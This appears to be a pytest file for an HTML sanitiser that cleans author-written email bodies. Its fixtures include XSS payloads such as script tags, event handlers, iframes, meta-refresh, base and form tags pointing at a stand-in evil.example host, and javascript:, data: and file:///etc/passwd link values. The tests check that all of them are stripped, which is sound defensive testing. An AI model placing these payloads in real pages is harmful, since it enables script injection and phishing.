"""LP-853 — the allowlist that replaces "safe by construction".

`email-body.ts` escapes every character that could begin markup BEFORE it emits a tag, so there is
no passthrough to leave open. Storing author HTML ends that property, and these are the tests for
what replaces it.

BUILT BY HAND, NOT THROUGH THE EDITOR — the ticket's own acceptance criterion, and the reason is
that the editor is not a security boundary. A processor cannot type `<script>` into Tiptap, so a
test that went through it would prove only that Tiptap works. Everything here is what a `curl`
sends.
"""

from __future__ import annotations

import pytest
from app.communications.sanitise import ALLOWED, href_is_safe, sanitise_html


@pytest.mark.parametrize(
    "payload",
    [
        "<script>alert(1)</script>",
        "<script src='https://evil.example/x.js'></script>",
        '<p onclick="alert(1)">hi</p>',
        "<p onerror=alert(1)>hi</p>",
        '<p style="color:red">hi</p>',
        '<p class="leak">hi</p>',
        "<img src=x onerror=alert(1)>",
        "<iframe src='https://evil.example'></iframe>",
        "<svg/onload=alert(1)>",
        "<object data='x'></object>",
        "<style>p{background:url(https://evil.example/t.png)}</style>",
        "<meta http-equiv='refresh' content='0;url=https://evil.example'>",
        "<base href='https://evil.example/'>",
        "<form action='https://evil.example'><input name='p'></form>",
    ],
)
def test_nothing_dangerous_survives(payload: str) -> None:
    """ACCEPTANCE 5. The output carries none of it — not disabled, not escaped-into-a-tag: absent.

    Asserted on the TAGS AND ATTRIBUTES rather than on the literal string, because `<script>` is
    also a thing a processor might legitimately write ABOUT, and the correct handling of that is
    escaped text.
    """
    out = sanitise_html(payload)
    assert "<script" not in out
    assert "onclick" not in out
    assert "onerror" not in out
    assert "onload" not in out
    assert "style=" not in out
    assert "class=" not in out
    assert "<iframe" not in out
    assert "<img" not in out
    assert "<svg" not in out
    assert "<form" not in out
    assert "<input" not in out
    assert "<meta" not in out
    assert "<base" not in out
    assert "<object" not in out


def test_the_test_above_can_fail() -> None:
    """THE POSITIVE CONTROL. Every assertion above is a not-in, and a function that returned the
    empty string for everything would satisfy all of them. This is the thing that proves the
    fixtures actually contain what is being stripped."""
    payload = "<script>alert(1)</script><p onclick='x' style='y' class='z'>hi</p><img src=x>"
    for forbidden in ("<script", "onclick", "style=", "class=", "<img"):
        assert forbidden in payload, f"the fixture never contained {forbidden!r}"
    assert sanitise_html(payload) == "<p>hi</p>"


def test_script_contents_go_with_the_tag() -> None:
    """Not merely escaped into view. A processor pasting a block off a web page should not find a
    stylesheet or a minified bundle in the middle of their email."""
    assert sanitise_html("<script>alert(1)</script><p>ok</p>") == "<p>ok</p>"
    assert sanitise_html("<style>p{color:red}</style><p>ok</p>") == "<p>ok</p>"


@pytest.mark.parametrize(
    "href",
    [
        "javascript:alert(1)",
        "JaVaScRiPt:alert(1)",
        "  javascript:alert(1)",
        "java\tscript:alert(1)",
        "java\nscript:alert(1)",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "vbscript:msgbox(1)",
        "file:///etc/passwd",
        "/relative/path",
        "#anchor",
    ],
)
def test_an_unsafe_href_is_refused(href: str) -> None:
    """A LINK IN AN EMAIL TO A BORROWER IS A PHISHING SURFACE if we let it be.

    The whitespace and case variants are not paranoia: a browser honours `JaVaScRiPt:` and strips
    the tab out of `java\\tscript:` before resolving, so a comparison against the raw string is a
    comparison against something nothing resolves.
    """
    assert href_is_safe(href) is False


@pytest.mark.parametrize(
    "href",
    [
        "https://example.com/docs",
        "http://example.com",
        "HTTPS://EXAMPLE.COM",
        "mailto:closings@acmetitle.example",
    ],
)
def test_a_safe_href_is_kept(href: str) -> None:
    """THE CONTROL for the list above — a rule that refused everything would pass it."""
    assert href_is_safe(href) is True


def test_the_allowlist_is_exactly_the_editor_schema() -> None:
    """LP-854 EXTENDS THIS AND THE TIPTAP EXTENSIONS TOGETHER, OR FORMATTING VANISHES ON SAVE.

    LP-849's own notes record exactly that: `htmlToEmailBody` stripped `**` from any `<strong>`
    ending in a colon while the renderer re-bolded only a capitalised run of 3-41 characters, and
    everything in the gap lost its asterisks. Three lists, two of them drifted.

    Pinned as a literal so that widening it is a decision somebody makes on purpose. A tag the
    editor can produce and this cannot store is formatting a processor watches disappear; a tag this
    stores and the editor cannot produce is a hole nothing else is watching.
    """
    assert set(ALLOWED) == {"p", "br", "strong", "ul", "li"}
    assert all(attributes == frozenset() for attributes in ALLOWED.values()), (
        "an attribute was allowed without a test naming why"
    )


def test_a_processors_own_words_survive_intact() -> None:
    """THE OTHER DIRECTION. A sanitiser that ate the message would pass every test above."""
    written = (
        "<p>Hello <strong>Akash</strong>,</p>"
        "<ul><li>Bank statement<ul><li>Where to get it: your bank</li></ul></li>"
        "<li>Pay stub</li></ul>"
        "<p>March statement only, not February.</p>"
    )
    assert sanitise_html(written) == written


def test_entities_are_not_decoded_twice() -> None:
    """`&amp;lt;` is a literal `&lt;` the author typed, not a `<`.

    `from-html.ts` records the same ordering bug in `unescapeHtml`: undo `&amp;` LAST, mirroring
    `escapeHtml` doing it FIRST, or text a person wrote becomes markup they did not.
    """
    assert sanitise_html("<p>&amp;lt;</p>") == "<p>&amp;lt;</p>"
    assert sanitise_html("<p>5 &lt; 6 &amp; 7</p>") == "<p>5 &lt; 6 &amp; 7</p>"


def test_text_outside_a_known_tag_is_kept_as_text() -> None:
    """A `<div>` is not markup we keep; the sentence inside it is a processor's sentence."""
    assert sanitise_html("<div>kept text</div>") == "kept text"
    assert sanitise_html("<h1>A heading</h1>") == "A heading"


def test_the_output_nests_even_when_the_input_does_not() -> None:
    """Unbalanced input is the ordinary shape of a paste. An unclosed `<strong>` that bled past the
    end of the body would bold whatever the mail client rendered next to it."""
    assert sanitise_html("<p>unclosed <strong>bold") == "<p>unclosed <strong>bold</strong></p>"
    assert sanitise_html("</p></strong><p>stray</p>") == "<p>stray</p>"
    assert sanitise_html("<p><strong>a</p></strong>") == "<p><strong>a</strong></p>"


def test_sanitising_twice_changes_nothing() -> None:
    """A draft is saved repeatedly as a processor types. A sanitiser that escaped its own output
    would turn a bold word into `&lt;strong&gt;` on the second save."""
    for payload in (
        "<p>Hello <strong>Akash</strong></p>",
        "<script>x</script><p>a<br>b</p>",
        "<div>text</div>",
        "<p>&amp;lt;</p>",
    ):
        once = sanitise_html(payload)
        assert sanitise_html(once) == once, payload
